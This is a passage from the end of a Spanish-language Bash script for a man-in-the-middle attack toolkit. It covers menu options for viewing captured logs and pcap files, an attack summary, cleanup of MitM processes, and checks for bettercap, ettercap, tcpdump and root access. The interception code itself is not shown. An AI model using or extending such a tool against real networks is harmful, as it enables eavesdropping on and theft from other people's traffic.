                if [[ -n "$OUTPUT_DIR" ]]; then
                    echo -e "${GREEN}📦 Datos capturados:${NC}"
                    find "$OUTPUT_DIR" -name "*.log" -o -name "*.pcap" -o -name "*.txt" | while read file; do
                        echo -e "\n${CYAN}📄 $(basename "$file"):${NC}"
                        head -10 "$file" 2>/dev/null || echo "Archivo binario o vacío"
                    done
                else
                    echo -e "${YELLOW}📭 No hay datos capturados${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            9)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_attack_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                cleanup_mitm_processes
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
echo -e "${CYAN}🔍 Verificando herramientas...${NC}"

missing_tools=()
recommended_tools=()

# Herramientas esenciales
for tool in iptables tcpdump; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

# Herramientas recomendadas
for tool in bettercap ettercap nmap tshark; do
    if ! command -v "$tool" &> /dev/null; then
        recommended_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install ${missing_tools[*]}${NC}"
    exit 1
fi

if [[ ${#recommended_tools[@]} -gt 0 ]]; then
    echo -e "${YELLOW}⚠️ Herramientas recomendadas faltantes: ${recommended_tools[*]}${NC}"
    echo -e "${CYAN}💡 Instala con: sudo apt install ${recommended_tools[*]}${NC}"
    echo -e "${BLUE}Algunas funciones avanzadas pueden no estar disponibles${NC}"
    echo ""
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para ataques MitM${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Configurar trap para limpieza al salir
trap cleanup_mitm_processes EXIT

# Ejecutar menú principal
main_menu